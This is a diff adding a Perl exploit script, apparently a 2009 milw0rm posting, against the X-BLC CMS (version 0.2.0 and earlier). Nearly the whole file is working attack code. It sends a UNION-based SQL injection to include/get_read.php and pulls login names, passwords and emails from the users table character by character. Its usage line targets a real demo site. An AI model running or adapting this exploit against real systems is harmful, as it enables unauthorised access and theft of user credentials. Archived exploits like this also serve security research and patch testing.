@@ -1,0 +1,81 @@
+#!/usr/bin/perl -w
+
+#  :::::::-.   ...    ::::::.    :::.
+#   ;;,   `';, ;;     ;;;`;;;;,  `;;;
+#   `[[     [[[['     [[[  [[[[[. '[[
+#    $$,    $$$$      $$$  $$$ "Y$c$$
+#    888_,o8P'88    .d888  888    Y88
+#    MMMMP"`   "YmmMMMM""  MMM     YM
+#   [ Discovered by dun \ dun[at]strcpy.pl ]
+#
+######################################################
+#  [ xblc <= 0.2.0 ]   SQL Injection Vulnerability   #
+######################################################
+# 
+# Script: "X-BLC is a dynamic web content management system written in PHP..."
+#
+# Script site: http://www.biolawcom.de/xblc/ ,	http://sourceforge.net/projects/xblc/
+# Download: http://downloads.sourceforge.net/xblc/xblc-0.2.0.zip?use_mirror=fastbull
+#
+# Usage: perl expl.pl http://www.biolawcom.de/demo/
+#
+#######################################################
+#
+# [ dun / 2009 ] 
+
+use IO::Socket;
+use Socket;
+use IO::Select;
+
+my @tables=("id","login_name","password","email","status");
+
+if(scalar(@ARGV) < 1) {
+	print "\nUsage: perl expl.pl http://site.com/path/\n\n";
+	exit;
+}
+
+foreach $t (@tables) {
+$i=1;
+print $t." = ";
+  do {
+	$path 	= "include/get_read.php?section=-1+UNION+SELECT+ORD(SUBSTRING(".$t.",".$i.",1))+FROM+users/*";
+	$host 	= $ARGV[0].$path;
+	#############################################
+	# $page = http_query($host, $proxy, $port); #
+	#############################################
+	$page = http_query($host);
+	$page =~ /guest=(.*)\,runTime=/;
+	$char=$1;
+	print chr($char);
+	$i++;
+  } while($char != 0);
+  print "\n";
+}
+  
+sub http_query {
+ my $page="";
+ my $url=$_[0];
+ if(defined($_[1]) && defined($_[2])) {
+	$host=$_[1];
+	$port=$_[2];
+	$get="GET $url HTTP/1.0\r\nUser-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)\r\nCookie: id=1\r\nConnection: Close\r\n\r\n";
+ } else {
+	$port=80;
+	$url=~s/http:\/\///;
+	$host=$url;
+	$query=$url;
+	$host=~s/([a-zA-Z0-9\.]+)\/.*/$1/;
+	$query=~s/$host//;
+	if ($query eq "") {$query="/";};
+	$get="GET $query HTTP/1.0\r\nHost: $host\r\nUser-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)\r\nCookie: id=1\r\nConnection: Close\r\n\r\n";
+ }
+ my $sock = IO::Socket::INET->new(PeerAddr=>"$host",PeerPort=>"$port",Proto=>"tcp",Timeout => 3) or return;
+ print $sock $get;
+ my @r = <$sock>;
+ $page="@r";
+ close($sock);
+ 	
+ return $page;
+}
+
+# milw0rm.com [2009-03-23]
